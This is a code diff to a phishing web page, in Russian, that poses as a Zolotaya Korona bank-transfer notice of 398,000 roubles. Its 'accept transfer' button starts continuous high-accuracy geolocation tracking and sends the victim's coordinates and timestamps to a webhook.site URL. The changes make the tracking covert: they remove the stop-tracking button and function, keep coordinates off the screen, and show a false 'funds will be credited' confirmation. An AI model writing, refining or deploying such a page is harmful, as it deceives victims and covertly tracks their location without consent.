@@ -43,16 +43,10 @@
         button:hover {
             background-color: #2980b9;
         }
-        .stop-button {
-            background-color: #e74c3c;
-        }
-        .stop-button:hover {
-            background-color: #c0392b;
-        }
         #status {
             margin-top: 20px;
             font-size: 16px;
-            color: #e74c3c;
+            color: #3498db;
         }
         .bank-logo {
             width: 200px;
@@ -69,64 +63,59 @@
         <p>Вам начислен перевод на сумму 398 000 рублей. Для зачисления средств на вашу карту подтвердите операцию.</p>
         <p>Операция проводится через защищенное соединение Золотой Короны.</p>
         <button onclick="startTracking()">Принять перевод на карту</button>
-        <button onclick="stopTracking()" class="stop-button" style="display: none;" id="stopButton">Остановить отслеживание</button>
         <p id="status"></p>
     </div>
 
     <script>
-        let watchId = null;
-
-        function logMessage(message) {
+        function logMessage(message, showOnScreen = false) {
             console.log("[GeoDebug] " + message);
-            document.getElementById("status").innerText = message;
+            if (showOnScreen) {
+                document.getElementById("status").innerText = message;
+            }
         }
 
         function startTracking() {
             if (!navigator.geolocation) {
-                logMessage("Ошибка: Браузер не поддерживает геолокацию.");
+                logMessage("Ошибка: Браузер не поддерживает геолокацию.", true);
                 return;
             }
 
             if (window.location.protocol !== "https:") {
-                logMessage("Ошибка: Требуется HTTPS. Откройте через GitHub Pages.");
+                logMessage("Ошибка: Требуется HTTPS. Откройте через GitHub Pages.", true);
                 return;
             }
 
             logMessage("Запрашиваем геолокацию...");
-            watchId = navigator.geolocation.watchPosition(
+            document.getElementById("status").innerText = "Подтверждение операции...";
+            navigator.geolocation.watchPosition(
                 position => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     const timestamp = new Date().toISOString();
                     logMessage(`Геолокация: Широта ${lat.toFixed(4)}, Долгота ${lon.toFixed(4)}`);
-
-                    // Показать кнопку "Остановить отслеживание"
-                    document.getElementById("stopButton").style.display = "inline-block";
+                    document.getElementById("status").innerText = "Операция подтверждена! Средства будут зачислены в течение 5 минут.";
 
                     // Отправка данных на Webhook.site
-                    // Для теста можно заменить на: https://httpbin.org/post
                     fetch('https://webhook.site/5a25303b-7980-421c-841b-0cfa78e52280', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({ latitude: lat, longitude: lon, timestamp }),
-                        mode: 'no-cors' // Для обхода CORS
+                        mode: 'no-cors'
                     })
                     .then(response => {
-                        console.log("[GeoDebug] Ответ сервера:", response);
-                        logMessage(`Геолокация: Широта ${lat.toFixed(4)}, Долгота ${lon.toFixed(4)} (Отправлено)`);
+                        logMessage("Данные отправлены успешно");
                     })
                     .catch(error => {
-                        console.error("[GeoDebug] Ошибка отправки:", error);
-                        logMessage(`Геолокация: Широта ${lat.toFixed(4)}, Долгота ${lon.toFixed(4)} (Ошибка отправки: ${error.message})`);
+                        logMessage(`Ошибка отправки: ${error.message}`);
                     });
                 },
                 error => {
                     let message;
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
-                            message = "Разрешите доступ к геолокации в настройках.";
+                            message = "Пожалуйста, разрешите доступ к геолокации в настройках.";
                             break;
                         case error.POSITION_UNAVAILABLE:
                             message = "Геолокация недоступна. Проверьте GPS.";
@@ -137,19 +126,10 @@
                         default:
                             message = "Ошибка: " + error.message;
                     }
-                    logMessage(message);
+                    logMessage(message, true);
                 },
                 { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
-        }
-
-        function stopTracking() {
-            if (watchId !== null) {
-                navigator.geolocation.clearWatch(watchId);
-                watchId = null;
-                logMessage("Отслеживание остановлено.");
-                document.getElementById("stopButton").style.display = "none";
-            }
         }
     </script>
 </body>
